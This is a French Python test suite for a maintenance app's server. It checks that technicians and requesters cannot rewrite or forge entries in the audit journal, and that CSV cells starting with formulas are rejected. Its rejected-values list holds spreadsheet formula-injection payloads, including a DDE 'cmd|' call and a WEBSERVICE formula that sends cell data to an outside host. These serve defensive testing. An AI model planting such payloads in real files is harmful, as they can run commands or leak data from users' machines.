"""Journal et formules côté serveur (T505, reporté sur la 2.1 ; relecture R4 : M3, M6 ; ARCHITECTURE.md §22.5, §3.2).

Ce qui est vérifié, en mode serveur avec comptes (vraies sessions sur une copie du jeu f3-v2.0.0) :
    technicien     ne vide ni ne réécrit journal.csv par PUT (403, fichier identique à l'octet) : ni en-tête seul, ni
                   ligne retirée, ni ligne modifiée ; le PUT qui garde chaque ligne et en ajoute (repli de
                   Donnees.ajouter après un 409 de l'ajout) passe, les lignes en place réécrites d'après le fichier ;
                   son ajout normal passe tel quel ; un profil qui n'est pas le sien est remplacé par le sien ;
    demandeur      son ajout normal passe ; une ligne au profil « Responsable » est écrite à son profil ; PUT : 403 ;
    numéro         un numéro déjà pris, vide ou mal formé est refusé à ces rôles (403), fichier inchangé ;
    responsable    réécrit le journal et y ajoute ce qu'il veut, comme avant ; sans comptes, rien ne change ;
    profil         celui de libelleJournal (js/app.js), dans la langue de l'installation (textes de js/i18n) ;
    formules       « -1+cmd|… » et « -2+WEBSERVICE(…) » refusées (400) ; un nombre négatif pur reste accepté ; même
                   règle que MOTIF_DEBUT_DANGEREUX de js/donnees.js, au nombre négatif près.

Aucune donnée réelle : copie temporaire du jeu f3-v2.0.0 (tests/jeux_formats.py). Sans navigateur.
Lancer depuis la racine du projet :
    py -X utf8 -m unittest discover -s tests -p "test_journal_roles.py" -v
"""
import csv
import http.client
import importlib.util
import io
import json
import re
import shutil
import tempfile
import unittest
from pathlib import Path

import commun
from commun import RACINE
from jeux_formats import copier_jeu

SCRIPT = RACINE / "serveur.py"
JEU = "f3-v2.0.0"
AGENT = "tests-prevo/1.0"
BOM = bytes((0xEF, 0xBB, 0xBF))
ENTETE = ["id", "date_heure", "poste", "profil", "table", "id_ligne", "action"]
REFUS = "Accès refusé : la table « journal » ne se modifie que par le responsable."
PROFIL_TECHNICIEN = "Technicien TEC-0001"          # compte julien.moreau de commun.COMPTES_DE_TEST
PROFIL_DEMANDEUR = "Demandeur Léa Martin"          # compte lea.martin


def lire_tableau(octets):
    lignes = [ligne for ligne in csv.reader(io.StringIO(octets.decode("utf-8-sig"), newline=""), delimiter=";") if ligne]
    return lignes[0], lignes[1:]


def cellule(texte):
    """Comme celluleCsv de js/donnees.js (§3.1)."""
    return '"' + texte.replace('"', '""') + '"' if re.search(r'[;"\r\n]|\A[ \t]|[ \t]\Z', texte) else texte


def ecrire_tableau(entete, lignes, bom=True):
    texte = "".join(";".join(cellule(valeur) for valeur in ligne) + "\r\n" for ligne in [entete] + list(lignes))
    return (BOM if bom else b"") + texte.encode("utf-8")


def ligne_de_journal(numero, profil, action="essai T505", table="ordres_travail", id_ligne="OT-2026-0001"):
    return [numero, "2026-11-12 10:00", "Poste essai", profil, table, id_ligne, action]


def requete(serveur, methode, chemin, corps=None, cookie=None, entetes=None):
    entetes = dict(entetes or {})
    entetes.setdefault("User-Agent", AGENT)
    if cookie:
        entetes["Cookie"] = cookie
    if methode in ("PUT", "POST"):
        entetes.setdefault("X-Prevo", "1")
        corps = b"" if corps is None else corps
    connexion = http.client.HTTPConnection("127.0.0.1", serveur.port, timeout=60)
    try:
        connexion.request(methode, chemin, body=corps, headers=entetes)
        reponse = connexion.getresponse()
        return reponse.status, {nom.lower(): valeur for nom, valeur in reponse.getheaders()}, reponse.read()
    finally:
        connexion.close()


def charger_module(nom):
    specification = importlib.util.spec_from_file_location(nom, SCRIPT)
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    return module


class CasServeur(unittest.TestCase):
    """Serveur réel sur une copie du jeu ; une session par rôle si COMPTES. Le journal est remis avant chaque test."""

    COMPTES = True

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.racine = Path(tempfile.mkdtemp(prefix="prevo-journal-roles-"))
        cls.addClassCleanup(shutil.rmtree, cls.racine, True)
        cls.serveur = commun.ServeurPrevo(source=copier_jeu(JEU, cls.racine / "source"), comptes=cls.COMPTES)
        cls.serveur.demarrer()
        cls.addClassCleanup(cls.serveur.arreter)
        cls.cookies = ({role: cls.serveur.session(role) for role in ("demandeur", "technicien", "responsable")}
                       if cls.COMPTES else {})
        cls.depart = (cls.serveur.dossier / "journal.csv").read_bytes()

    def setUp(self):
        (self.serveur.dossier / "journal.csv").write_bytes(self.depart)

    def fichier(self):
        return (self.serveur.dossier / "journal.csv").read_bytes()

    def lignes(self):
        return lire_tableau(self.fichier())[1]

    def mettre(self, role, octets):
        """PUT du journal entier, avec la version du fichier en place."""
        version = requete(self.serveur, "GET", "/api/versions", None, self.cookies.get("responsable"))
        attendue = json.loads(version[2].decode("utf-8"))["tables"]["journal"]["version"]
        return requete(self.serveur, "PUT", "/api/csv/journal", octets, self.cookies.get(role),
                       {"X-Version-Attendue": attendue})

    def ajouter(self, role, *lignes):
        return requete(self.serveur, "POST", "/api/csv/journal/ajout", ecrire_tableau(ENTETE, lignes, bom=False),
                       self.cookies.get(role))

    def assertRefus(self, reponse, message=REFUS):
        self.assertEqual(reponse[0], 403, reponse[2][:300])
        self.assertEqual(json.loads(reponse[2].decode("utf-8"))["erreur"], message)
        self.assertEqual(self.fichier(), self.depart)

    def assertAccepte(self, reponse):
        self.assertEqual(reponse[0], 200, reponse[2][:300])


class TestTechnicien(CasServeur):

    def test_ne_vide_pas_le_journal(self):
        self.assertGreater(len(lire_tableau(self.depart)[1]), 3)
        self.assertRefus(self.mettre("technicien", ecrire_tableau(ENTETE, [])))

    def test_ne_retire_ni_ne_modifie_une_ligne(self):
        entete, lignes = lire_tableau(self.depart)
        self.assertRefus(self.mettre("technicien", ecrire_tableau(entete, lignes[1:])))
        modifiees = [list(ligne) for ligne in lignes]
        modifiees[0][entete.index("action")] = "réécrit"
        self.assertRefus(self.mettre("technicien", ecrire_tableau(entete, modifiees)))
        usurpees = [list(ligne) for ligne in lignes]
        usurpees[1][entete.index("profil")] = "Responsable"
        self.assertRefus(self.mettre("technicien", ecrire_tableau(entete, usurpees)))
        # une ligne « nouvelle » qui reprend un numéro en place
        self.assertRefus(self.mettre("technicien", ecrire_tableau(entete, lignes + [
            ligne_de_journal(lignes[0][0], PROFIL_TECHNICIEN)])))

    def test_repli_du_navigateur_lignes_gardees_et_ajout(self):
        """Donnees.ajouter se replie sur modifier (PUT du fichier relu, plus les lignes) quand l'ajout rend 409."""
        entete, lignes = lire_tableau(self.depart)
        nouvelle = ligne_de_journal("J-20261112100000-AB12", PROFIL_TECHNICIEN)
        usurpee = ligne_de_journal("J-20261112100001-AB13", "Responsable", "dérogation")
        self.assertAccepte(self.mettre("technicien", ecrire_tableau(entete, lignes + [nouvelle, usurpee])))
        ecrites = self.lignes()
        self.assertEqual(ecrites[:len(lignes)], lignes)
        self.assertEqual(ecrites[len(lignes):], [nouvelle, usurpee[:3] + [PROFIL_TECHNICIEN] + usurpee[4:]])
        self.assertTrue(self.fichier().startswith(self.depart))         # les lignes en place, à l'octet

    def test_ajout_normal_tel_quel(self):
        nouvelle = ligne_de_journal("J-20261112100000-AB12", PROFIL_TECHNICIEN)
        self.assertAccepte(self.ajouter("technicien", nouvelle))
        self.assertEqual(self.fichier(), self.depart + ecrire_tableau(ENTETE, [nouvelle], bom=False).split(b"\r\n", 1)[1])

    def test_ajout_au_profil_d_un_autre_ecrit_au_sien(self):
        for numero, profil in enumerate(("Responsable", "responsable", "Technicien TEC-0002", "Demandeur Léa Martin", "")):
            with self.subTest(profil=profil):
                nouvelle = ligne_de_journal("J-20261112100000-AB%02d" % numero, profil)
                self.assertAccepte(self.ajouter("technicien", nouvelle))
                self.assertEqual(self.lignes()[-1], nouvelle[:3] + [PROFIL_TECHNICIEN] + nouvelle[4:])
        self.assertTrue(self.fichier().startswith(self.depart))

    def test_numero_pris_vide_ou_mal_forme_refuse(self):
        pris = lire_tableau(self.depart)[1][2][0]
        for numero in (pris, "", "'" + pris, " " + pris, "J 1"):
            with self.subTest(numero=numero):
                self.assertRefus(self.ajouter("technicien", ligne_de_journal(numero, PROFIL_TECHNICIEN)))
        deux = ligne_de_journal("J-20261112100000-AB12", PROFIL_TECHNICIEN)
        self.assertRefus(self.ajouter("technicien", deux, deux))


class TestDemandeur(CasServeur):

    def test_ajout_normal_tel_quel(self):
        nouvelle = ligne_de_journal("J-20261112100000-CD12", PROFIL_DEMANDEUR, "création", "demandes", "DI-2026-0099")
        self.assertAccepte(self.ajouter("demandeur", nouvelle))
        self.assertEqual(self.lignes()[-1], nouvelle)

    def test_ligne_au_profil_responsable_ecrite_au_sien(self):
        """Preuve du relecteur : « JRN-2;2026-11-12 10:00;PC;responsable;habilitations;HAB-1;faux »."""
        recue = ["JRN-2", "2026-11-12 10:00", "PC", "responsable", "habilitations", "HAB-1", "faux"]
        self.assertAccepte(self.ajouter("demandeur", recue))
        self.assertEqual(self.lignes()[-1], recue[:3] + [PROFIL_DEMANDEUR] + recue[4:])
        self.assertNotIn("esponsable", self.lignes()[-1][3])

    def test_put_refuse_et_numero_pris_refuse(self):
        reponse = self.mettre("demandeur", ecrire_tableau(ENTETE, []))
        self.assertEqual(reponse[0], 403, reponse[2][:300])
        self.assertEqual(self.fichier(), self.depart)
        pris = lire_tableau(self.depart)[1][0][0]
        self.assertRefus(self.ajouter("demandeur", ligne_de_journal(pris, PROFIL_DEMANDEUR)))


class TestResponsable(CasServeur):

    def test_reecrit_et_ajoute_comme_avant(self):
        entete, lignes = lire_tableau(self.depart)
        self.assertAccepte(self.mettre("responsable", ecrire_tableau(entete, lignes[1:])))
        self.assertEqual(self.lignes(), lignes[1:])
        libre = ligne_de_journal(lignes[1][0], "Technicien TEC-0002")       # même un numéro pris, même un autre profil
        self.assertAccepte(self.ajouter("responsable", libre))
        self.assertEqual(self.lignes()[-1], libre)


class TestSansComptes(CasServeur):

    COMPTES = False

    def test_rien_ne_change(self):
        libre = ligne_de_journal("JRN-2", "Responsable")
        self.assertAccepte(self.ajouter(None, libre))
        self.assertEqual(self.lignes()[-1], libre)
        self.assertAccepte(requete(self.serveur, "PUT", "/api/csv/journal", ecrire_tableau(ENTETE, []), None, {
            "X-Version-Attendue": json.loads(requete(self.serveur, "GET", "/api/versions")[2])["tables"]["journal"][
                "version"]}))
        self.assertEqual(self.lignes(), [])


# ---------------------------------------------------------------------------
# Le profil écrit est celui de libelleJournal (js/app.js), dans la langue de l'installation
# ---------------------------------------------------------------------------

def texte_js(langue, cle):
    """Valeur d'une clé de js/i18n/<langue>.js (une clé par ligne, sans échappement dans ces clés-là)."""
    source = (RACINE / "js" / "i18n" / (langue + ".js")).read_text(encoding="utf-8")
    return re.search(r"^  '%s': '(.*)',$" % re.escape(cle), source, re.MULTILINE).group(1)


class TestProfilAuJournal(unittest.TestCase):

    TECHNICIEN = {"identifiant": "julien.moreau", "role": "technicien", "prenom": "Julien", "nom": "Moreau",
                  "technicien_id": "TEC-0001", "appareil": False}
    DEMANDEUR = {"identifiant": "lea.martin", "role": "demandeur", "prenom": "Léa", "nom": "Martin",
                 "technicien_id": "", "appareil": False}
    APPAREIL = {"identifiant": "appareil:A1", "role": "demandeur", "prenom": "", "nom": "Atelier nord",
                "technicien_id": "", "appareil": True}

    @classmethod
    def setUpClass(cls):
        cls.module = charger_module("serveur_t505")

    def config(self, langue):
        dossier = Path(tempfile.mkdtemp(prefix="prevo-journal-langue-"))
        self.addCleanup(shutil.rmtree, dossier, True)
        config = self.module.Configuration(str(dossier / "donnees"), [])
        self.module.creer_dossiers(config)
        if langue is not None:
            (Path(config.dossier_donnees) / "parametres.csv").write_bytes(
                ecrire_tableau(["cle", "valeur"], [["langue_defaut", langue]]))
        return config

    def test_francais_sans_reglage_et_modeles_de_fr_js(self):
        for config in (None, self.config(None), self.config("fr"), self.config("xx")):
            self.assertEqual(self.module.profil_au_journal(self.TECHNICIEN, config), PROFIL_TECHNICIEN)
            self.assertEqual(self.module.profil_au_journal(self.DEMANDEUR, config), PROFIL_DEMANDEUR)
            self.assertEqual(self.module.profil_au_journal(self.APPAREIL, config), "Demandeur Atelier nord")
        self.assertEqual(texte_js("fr", "socle.libelle_journal.technicien_technicien_id").replace(
            "{technicienId}", "TEC-0001"), PROFIL_TECHNICIEN)
        self.assertEqual(texte_js("fr", "socle.libelle_journal.demandeur_p_nom").replace("{nom}", "Léa Martin"),
                         PROFIL_DEMANDEUR)

    def test_langue_de_l_installation(self):
        for langue in self.module.langues_declarees():
            with self.subTest(langue=langue):
                config = self.config(langue)
                self.assertEqual(
                    self.module.profil_au_journal(self.TECHNICIEN, config),
                    texte_js(langue, "socle.libelle_journal.technicien_technicien_id").replace("{technicienId}", "TEC-0001"))
                self.assertEqual(self.module.profil_au_journal(self.DEMANDEUR, config),
                                 texte_js(langue, "socle.libelle_journal.demandeur_p_nom").replace("{nom}", "Léa Martin"))
        self.assertEqual(self.module.profil_au_journal(self.TECHNICIEN, self.config("en")), "Technician TEC-0001")

    def test_aucun_controle_pour_le_responsable_ni_sans_comptes(self):
        responsable = {"identifiant": "nicolas.briand", "role": "responsable", "appareil": False}
        for identite in (None, responsable):
            self.assertIsNone(self.module.controle_d_ecriture(identite, "journal"))
            self.assertIsNone(self.module.controle_d_ajout(identite, "journal"))

    def test_nom_qui_ferait_une_formule_reste_un_texte(self):
        piege = dict(self.DEMANDEUR, prenom="", nom="=1+1")
        self.assertFalse(self.module.MOTIF_CELLULE_DANGEREUSE.match(self.module.profil_au_journal(piege)))


# ---------------------------------------------------------------------------
# Formules : tout tiret en tête, sauf un nombre négatif pur (M6)
# ---------------------------------------------------------------------------

REFUSEES = ("-1+1+cmd|' /C calc'!A0", '-2+WEBSERVICE("http://x/"&A1)', '-,5+HYPERLINK("http://x")', "-cmd", "-",
            "--1", "-1-1", "-1*2", "-12.5.3", "-1e5+A1", "-.5.5", "-1 ", "- 1", "-1/2", "=1+1", "+1", "@SUM(A1)",
            "\tx", "-12abc", "-0x1F")
NEGATIFS = ("-1", "-12.5", "-12,5", "-0", "-0.001", "-1250", "-1e-7", "-2.5E+3", "-.5", "-,5")
INOFFENSIVES = ("", "12", "texte", "a-b", " -1+1", "'-1+cmd", "'=1+1", "2026-11-12", "TEC-0001")


class TestFormules(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.module = charger_module("serveur_t505_formules")
        source = (RACINE / "js" / "donnees.js").read_text(encoding="utf-8")
        motif = re.search(r"const MOTIF_DEBUT_DANGEREUX = /(.+?)/;", source).group(1)
        cls.navigateur = re.compile(motif)             # /^[=+\-@\t\r]/ : même écriture en Python

    def refusee(self, valeur, table="articles"):
        colonnes = list(self.module.COLONNES_PAR_TABLE[table])
        ligne = ["ART-0001"] + [""] * (len(colonnes) - 2) + [valeur]
        try:
            self.module.verifier_contenu_csv(table, ecrire_tableau(colonnes, [ligne]))
        except self.module.ErreurHttp as erreur:
            self.assertEqual(erreur.statut, 400)
            return True
        return False

    def test_expressions_refusees(self):
        for valeur in REFUSEES:
            with self.subTest(valeur=valeur):
                self.assertTrue(self.refusee(valeur))

    def test_nombres_negatifs_et_textes_acceptes(self):
        for valeur in NEGATIFS + INOFFENSIVES:
            with self.subTest(valeur=valeur):
                self.assertFalse(self.refusee(valeur))

    def test_meme_regle_que_le_navigateur_au_nombre_negatif_pres(self):
        """Le navigateur protège (apostrophe) tout texte que MOTIF_DEBUT_DANGEREUX reconnaît ; le serveur refuse ces
        mêmes valeurs sans apostrophe, sauf un nombre négatif pur (colonne numérique, écrite sans apostrophe), et
        accepte la forme protégée."""
        for valeur in REFUSEES + NEGATIFS + INOFFENSIVES:
            with self.subTest(valeur=valeur):
                protegee_par_le_navigateur = bool(self.navigateur.match(valeur))
                self.assertEqual(self.refusee(valeur), protegee_par_le_navigateur and valeur not in NEGATIFS)
                self.assertFalse(self.refusee("'" + valeur))

    def test_par_l_api(self):
        with commun.ServeurPrevo(source=copier_jeu(JEU, Path(tempfile.mkdtemp(prefix="prevo-formules-")) / "s"),
                                 comptes=True) as serveur:
            self.addCleanup(shutil.rmtree, serveur.dossier, True)
            cookie = serveur.session("demandeur")
            entete, lignes = lire_tableau((serveur.dossier / "demandes.csv").read_bytes())
            modele = dict(zip(entete, lignes[0]))
            for numero, (description, statut) in enumerate(((REFUSEES[0], 400), (REFUSEES[1], 400),
                                                             ("'" + REFUSEES[1], 200), ("fuite d'huile", 200))):
                with self.subTest(description=description):
                    ligne = dict.fromkeys(entete, "")
                    ligne.update(id="DI-2026-9%03d" % numero, statut="Nouvelle", description=description,
                                 date_creation=modele.get("date_creation", ""), equipement_id=modele.get("equipement_id", ""),
                                 demandeur="Léa Martin")
                    reponse = requete(serveur, "POST", "/api/csv/demandes/ajout",
                                      ecrire_tableau(entete, [[ligne[nom] for nom in entete]], bom=False), cookie)
                    self.assertEqual(reponse[0], statut, reponse[2][:300])


if __name__ == "__main__":
    unittest.main()
